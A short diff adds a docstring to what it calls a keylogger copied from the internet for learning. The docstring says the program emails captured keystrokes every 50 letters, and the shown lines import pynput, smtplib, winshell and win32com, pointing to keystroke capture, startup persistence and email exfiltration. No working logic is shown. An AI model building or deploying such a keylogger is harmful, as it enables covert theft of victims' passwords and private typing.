@@ -1,3 +1,7 @@
+"""
+I took this keylogger from internet (developed by Edinson Requena)to learn from some libraries like os, pynput and email.
+This keylogger send the information every 50 letters via e-mail.
+"""
 from pynput.keyboard import Key, Listener
 import os, shutil, datetime, winshell, tempfile, smtplib
 from win32com.client import Dispatch
